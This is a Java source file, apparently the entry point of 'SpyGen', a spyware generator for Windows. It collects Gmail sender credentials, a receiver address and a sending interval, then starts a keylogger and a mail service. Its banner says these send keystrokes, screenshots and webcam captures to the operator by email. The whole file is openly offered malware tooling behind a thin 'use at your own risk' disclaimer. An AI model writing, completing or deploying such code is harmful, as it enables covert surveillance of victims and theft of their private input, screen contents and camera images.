package com.houarizegai.spygen;

import com.houarizegai.spygen.global.Settings;
import com.houarizegai.spygen.global.Utils;

import static com.houarizegai.spygen.global.Color.*;

import com.houarizegai.spygen.keylogger.Keylogger;
import com.houarizegai.spygen.mail.SenderService;
import com.houarizegai.spygen.validators.RegexValidator;

import java.util.Scanner;

public class SpyGen {

    private static final Scanner mScanner = new Scanner(System.in);

    public static void main(String[] args) {
        checkSupportedOS();
        showMenu();
    }

    private static void checkSupportedOS() {
        if (!System.getProperty("os.name").toLowerCase().contains("windows")) {
            System.out.println("[!] OS is not supported!");
            System.exit(0);
        }
    }

    private static void showMenu() {
        System.out.printf("""
                %s   SpyGen [Spyware Generator tool] %s  Version: 0.1   
                %s                    Written by Houari ZEGAI                        
                %s                                                                  
                %s                      ** DISCLAIMER **                           
                %s THIS SOFTWARE IS PROVIDED \"AS IS\" WITHOUT WARRANTY OF ANY KIND.
                %s YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE  
                %s RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO         
                %s LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE       
                %s CAUSED BY THIS PROGRAM.                                          
                %s                                                                  
                %s Close this window if you wish to exit. Otherwise,                
                %s press [ENTER] key to continue...
                """, RED, GREEN, BLUE, WHITE, YELLOW, WHITE, WHITE, WHITE, WHITE, WHITE, WHITE, WHITE, WHITE
        );

        mScanner.nextLine();
        showFillInfo();
    }

    private static void showFillInfo() {
        Utils.clearScreen();
        System.out.println(""
                + RED + "          +---------------------------------------------------+\n"
                + RED + "    (__)  | " + YELLOW + "WARNING: Use Gmail account only!                  " + RED + "|\n"
                + RED + " (|)(00)  | " + WHITE + "E-mail will be sent when it reaches the specified " + RED + "|\n"
                + RED + "  |/(__)\\ | " + WHITE + "Data will send it in period time specified with   " + RED + "|\n"
                + RED + "  |_/ _|  | " + WHITE + "Keylogger, Screenshot and Webcam Capture.         " + RED + "|\n"
                + RED + "          +---------------------------------------------------+\n");

        System.out.println(YELLOW + "NOTE:" + WHITE + " Allow access to less secure apps on your gmail account.");
        System.out.println(WHITE + " -> https://www.google.com/settings/security/lesssecureapps");
        System.out.println(YELLOW + " GENERATE SPYWARE\n" + YELLOW + " --------------------------------------------");

        System.out.print(YELLOW + "[*] Enter your E-mail: " + WHITE);
        Settings.senderMail = mScanner.nextLine();
        while (!RegexValidator.isEmail(Settings.senderMail)) {
            System.out.print(YELLOW + "[*] Enter your E-mail: " + WHITE);
            Settings.senderMail = mScanner.nextLine();
        }

        System.out.print(YELLOW + "[*] Enter receiver E-mail: " + WHITE);
        Settings.receiverMail = mScanner.nextLine();
        while (!RegexValidator.isEmail(Settings.receiverMail)) {
            System.out.print(YELLOW + "[*] Enter receiver E-mail: " + WHITE);
            Settings.receiverMail = mScanner.nextLine();
        }

        System.out.print(YELLOW + "[*] Enter your Password: " + WHITE);
        Settings.senderPassword = mScanner.nextLine();
        while (Settings.senderPassword.equalsIgnoreCase("")) {
            System.out.print(YELLOW + "[*] Enter your Password: " + WHITE);
            Settings.senderPassword = mScanner.nextLine();
        }

        System.out.print(YELLOW + "[*] Enter period sending data (per second): " + WHITE);
        String periodSending = mScanner.nextLine();
        while (!periodSending.trim().matches("[0-9]+")) {
            System.out.print(YELLOW + "[*] Enter period sending data (per second): " + WHITE);
            periodSending = mScanner.nextLine();
        }
        Settings.periodSendingSeconds = Integer.parseInt(periodSending);

        System.out.printf("""
                %s +------------------------------------------+
                %s   Email: %s %s
                %s   Password: %s %s
                %s   Receiver mail: %s %s
                %s   Period sending data [per second]: %s %s
                %s +------------------------------------------+
                """, GREEN, GREEN, WHITE, Settings.senderMail, GREEN, WHITE, Settings.senderPassword, GREEN, WHITE,
                Settings.receiverMail, GREEN, WHITE, Settings.periodSendingSeconds, GREEN
                );

        String optConfirm;
        do {
            System.out.print(YELLOW + "\n [*] The information above is correct? (y/n): " + WHITE);
            optConfirm = mScanner.nextLine();
        } while (optConfirm.trim().isEmpty());

        if (optConfirm.trim().equalsIgnoreCase("y")) {
            // run
            Keylogger.startKeylogger();
            new SenderService();
        } else if (optConfirm.trim().equalsIgnoreCase("n")) {
            Utils.waitSeconds(1);
            showFillInfo();
        } else {
            System.out.println("[*] Invalid option!");
            Utils.waitSeconds(1);
            showFillInfo();
        }
    }
}